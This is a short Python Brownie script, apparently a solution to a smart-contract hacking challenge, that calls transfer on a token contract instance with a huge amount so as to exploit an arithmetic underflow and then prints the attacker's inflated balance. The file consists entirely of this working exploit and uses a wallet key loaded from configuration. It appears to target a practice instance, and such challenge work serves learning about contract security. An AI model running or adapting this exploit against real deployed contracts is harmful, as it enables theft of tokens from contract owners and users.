from brownie import interface, accounts, config

INSTANCE_ADDRESS = "0x586B33801119747631A650E7A026837945850988"
ACCOUNT = accounts.add(config["wallets"]["from_key"])

ADDRESS_TO_SEND = "0x468F2866Cd6aEcf640644885F6Cad63Ff4f9BC4c"

def hack():
    # grab the Token contract Object
    instance_contract = interface.IToken(INSTANCE_ADDRESS)

    # hack the contract
    tx = instance_contract.transfer(ADDRESS_TO_SEND, 100000000000000000000000000000000000000000000000000000000000000000000000000, {"from": ACCOUNT})
    tx.wait(1)
        
    print(f"Contract has been hacked. Now we have {instance_contract.balanceOf(ACCOUNT)} tokens")

def main():
    hack()
